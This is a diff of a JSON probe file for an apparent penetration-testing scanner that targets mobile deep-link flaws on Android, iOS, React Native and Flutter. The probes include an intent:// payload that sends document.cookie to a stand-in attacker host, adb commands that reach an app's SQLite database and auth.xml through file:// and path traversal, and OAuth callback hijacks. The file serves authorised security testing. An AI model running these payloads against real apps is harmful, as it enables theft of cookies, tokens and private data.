@@ -1,17 +1,22 @@
 {
   "category": "mobile_deeplink",
-  "description": "Mobile deep-link surface: Android intent:// URIs + intent-filter exported activities, iOS universal links (apple-app-site-association), iOS custom URL schemes, and Flutter / React Native router parameter injection. Reference-only — requires device + manifest inspection. Maps to OWASP Mobile Top 10 2024 M4 (Insufficient Input/Output Validation) + HackTricks Mobile section.",
+  "description": "Mobile deep-link surface: Android intent:// URIs + intent-filter exported activities, iOS universal links (apple-app-site-association), iOS custom URL schemes, and Flutter / React Native router parameter injection. Reference-only — requires device + manifest inspection. Maps to OWASP Mobile Top 10 2024 M4 (Insufficient Input/Output Validation) + HackTricks Mobile section. Active in W8: deeplink_oauth_callback_backend_reflection + deeplink_webview_backend_loadurl fire on HTTP traffic captured AFTER operator triggers the deep link via am-start / mobile_adb_pack.",
   "contexts": {
     "android_implicit_intent_redirect": {
       "description": "App accepts intent:// URI from third-party (browser, other app) and forwards as Intent. If extras carry attacker-controlled component name → arbitrary activity launch with attacker extras.",
-      "tech_match": ["android"],
+      "tech_match": [
+        "android"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "intent://victim/#Intent;scheme=https;package=com.victim.app;action=android.intent.action.VIEW;S.url=javascript:fetch('https://attacker/?c='%2Bdocument.cookie);end",
           "description": "Browser → intent → app: extras.url passed to WebView.loadUrl. javascript: scheme → JS execution inside app's WebView session.",
           "matchers": [
-            {"type": "literal", "pattern": "intent://"}
+            {
+              "type": "literal",
+              "pattern": "intent://"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 80,
@@ -21,7 +26,10 @@
           "payload": "intent://#Intent;component=com.victim.app/.SettingsActivity;end",
           "description": "Explicit component target — bypasses intent-filter restrictions if activity not declared android:exported='false'",
           "matchers": [
-            {"type": "literal", "pattern": "component="}
+            {
+              "type": "literal",
+              "pattern": "component="
+            }
           ],
           "severity": "high",
           "confidence_boost": 75,
@@ -31,7 +39,10 @@
           "payload": "intent://#Intent;component=com.victim.app/.WebViewActivity;S.url=file:///data/data/com.victim.app/databases/users.db;end",
           "description": "Force WebView activity to load local file URL — exfil app's own SQLite databases if file:// access enabled",
           "matchers": [
-            {"type": "literal", "pattern": "file://"}
+            {
+              "type": "literal",
+              "pattern": "file://"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 85,
@@ -41,14 +52,19 @@
     },
     "android_exported_activity_takeover": {
       "description": "Exported activity (android:exported='true' OR has intent-filter — implicit-exported pre-API-31) callable from any other app on device. Privilege boundary == app sandbox boundary.",
-      "tech_match": ["android"],
+      "tech_match": [
+        "android"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "adb shell am start -n com.victim.app/.WebViewActivity -d 'https://attacker/'",
           "description": "Launch activity with attacker URL. Use adb when device authorised; equivalent crafted intent: in malicious app context.",
           "matchers": [
-            {"type": "literal", "pattern": "am start"}
+            {
+              "type": "literal",
+              "pattern": "am start"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 80,
@@ -58,7 +74,10 @@
           "payload": "adb shell am start -n com.victim.app/.export.ExportActivity --es file '../../shared_prefs/auth.xml'",
           "description": "Pass extras with traversal — if activity reads --es file and reflects/exports, app's own auth.xml leaks",
           "matchers": [
-            {"type": "literal", "pattern": "shared_prefs"}
+            {
+              "type": "literal",
+              "pattern": "shared_prefs"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 85,
@@ -68,14 +87,19 @@
     },
     "android_custom_scheme_takeover": {
       "description": "App registers myapp:// scheme + same scheme is registered by another app installed on device — first app to intent-filter handles. Pre-fillable URLs in browser bookmark / web link → install hijacker.",
-      "tech_match": ["android"],
+      "tech_match": [
+        "android"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "myapp://oauth/callback?code=ATTACKER_CONTROLLED",
           "description": "OAuth callback hijack — attacker app intent-filters myapp://oauth/* and steals authorization code en route to victim app",
           "matchers": [
-            {"type": "literal", "pattern": "://oauth/"}
+            {
+              "type": "literal",
+              "pattern": "://oauth/"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 80,
@@ -85,15 +109,32 @@
     },
     "ios_universal_link_misconfig": {
       "description": "iOS universal links via apple-app-site-association (AASA) file at /.well-known/apple-app-site-association — if path patterns too permissive (\"*\"), attacker can register a sibling AASA on a subdomain they control and intercept.",
-      "tech_match": ["ios", "apple"],
+      "tech_match": [
+        "ios",
+        "apple"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "/.well-known/apple-app-site-association",
           "description": "Fetch AASA — examine applinks.details[].paths. Wildcards like ['*'] or ['/oauth/*'] are red flags.",
           "matchers": [
-            {"type": "status", "status": [200], "condition": "and"},
-            {"type": "word", "words": ["applinks", "appID", "paths"], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                200
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "words": [
+                "applinks",
+                "appID",
+                "paths"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "medium",
           "confidence_boost": 50,
@@ -103,8 +144,21 @@
           "payload": "/apple-app-site-association",
           "description": "Legacy path (pre iOS 9.3) — sometimes still served alongside the .well-known one",
           "matchers": [
-            {"type": "status", "status": [200], "condition": "and"},
-            {"type": "word", "words": ["applinks", "appID"], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                200
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "words": [
+                "applinks",
+                "appID"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "low",
           "confidence_boost": 30,
@@ -114,14 +168,19 @@
     },
     "ios_custom_url_scheme": {
       "description": "iOS custom URL schemes (myapp://) are NOT unique-registered — multiple apps can claim same scheme. App must verify caller via LSApplicationQueriesSchemes + handleOpenURL source-app validation.",
-      "tech_match": ["ios"],
+      "tech_match": [
+        "ios"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "myapp://oauth/callback?code=A",
           "description": "Crafted callback — works the same way as Android custom scheme but with iOS's last-installed-wins behaviour.",
           "matchers": [
-            {"type": "literal", "pattern": "://oauth/"}
+            {
+              "type": "literal",
+              "pattern": "://oauth/"
+            }
           ],
           "severity": "high",
           "confidence_boost": 70,
@@ -131,15 +190,31 @@
     },
     "android_app_links_signature_required": {
       "description": "Android App Links via /.well-known/assetlinks.json (Digital Asset Links). Misconfigured assetlinks.json (wrong SHA-256 fingerprint, missing entries for staging variants) allows attacker app to claim links.",
-      "tech_match": ["android"],
+      "tech_match": [
+        "android"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "/.well-known/assetlinks.json",
           "description": "Fetch assetlinks.json — verify sha256_cert_fingerprints field present and matches victim app signing cert",
           "matchers": [
-            {"type": "status", "status": [200], "condition": "and"},
-            {"type": "word", "words": ["delegate_permission", "sha256_cert_fingerprints", "android_app"], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                200
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "words": [
+                "delegate_permission",
+                "sha256_cert_fingerprints",
+                "android_app"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "medium",
           "confidence_boost": 50,
@@ -149,14 +224,21 @@
     },
     "rn_flutter_deeplink_router": {
       "description": "React Native and Flutter apps consume deep-link parameters in JS/Dart router code. Often pass user-controlled string to navigator.push without route allowlist — opens any registered route + attacker-controlled args.",
-      "tech_match": ["react-native", "flutter", "expo"],
+      "tech_match": [
+        "react-native",
+        "flutter",
+        "expo"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "appscheme://navigate?route=admin&user_id=1",
           "description": "Deep link forces app to admin route with attacker user_id — privilege escalation if route lacks server-side check",
           "matchers": [
-            {"type": "literal", "pattern": "route="}
+            {
+              "type": "literal",
+              "pattern": "route="
+            }
           ],
           "severity": "high",
           "confidence_boost": 70,
@@ -166,18 +248,77 @@
     },
     "deeplink_dangerous_intent_actions": {
       "description": "Android intent actions worth exploring on exported components: SEND, SEND_MULTIPLE (file share), VIEW (web URL), EDIT (in-place edit), PICK (chooser). Each accepts EXTRA_STREAM URI which webviews/file-readers often resolve naively.",
-      "tech_match": ["android"],
+      "tech_match": [
+        "android"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "adb shell am start -a android.intent.action.SEND -t text/plain --eu android.intent.extra.STREAM 'file:///etc/hosts' -n com.victim.app/.share.ShareActivity",
           "description": "EXTRA_STREAM with file:// URI pointing at sensitive file — if share activity reads stream content and exfils, content disclosure",
           "matchers": [
-            {"type": "literal", "pattern": "EXTRA_STREAM"}
+            {
+              "type": "literal",
+              "pattern": "EXTRA_STREAM"
+            }
           ],
           "severity": "high",
           "confidence_boost": 75,
           "variables": {}
+        }
+      ]
+    },
+    "deeplink_oauth_callback_backend_reflection": {
+      "description": "OAuth callback via custom scheme reaches backend (token-exchange / state-validation endpoint). Backend reflects redirect_uri / code / state — observable via Burp proxy history after operator triggers am-start with crafted deep link.",
+      "tech_match": [],
+      "param_match": [
+        "redirect_uri",
+        "code",
+        "state",
+        "client_id"
+      ],
+      "probes": [
+        {
+          "payload": "praetor-canary-oauth-{{randstr}}",
+          "description": "Inject canary into deep-link state — backend that echoes state in subsequent HTTP response confirms cross-app deep-link → backend reach.",
+          "matchers": [
+            {
+              "type": "reflection",
+              "marker": "praetor-canary-oauth-"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {
+            "manual_chain": true
+          }
+        }
+      ]
+    },
+    "deeplink_webview_backend_loadurl": {
+      "description": "Deep link forces in-app WebView to load attacker URL; that URL hits Praetor-controlled callback or backend endpoint. Backend traffic captured shows external host reach + cookie attachment.",
+      "tech_match": [],
+      "param_match": [
+        "url",
+        "target",
+        "dest",
+        "redirect"
+      ],
+      "probes": [
+        {
+          "payload": "http://{{collaborator}}/webview-deeplink",
+          "description": "Deep-link triggers WebView load of Collaborator URL — DNS/HTTP interaction confirms reachability and reveals attached cookies.",
+          "matchers": [
+            {
+              "type": "collaborator",
+              "interaction": "any"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     }
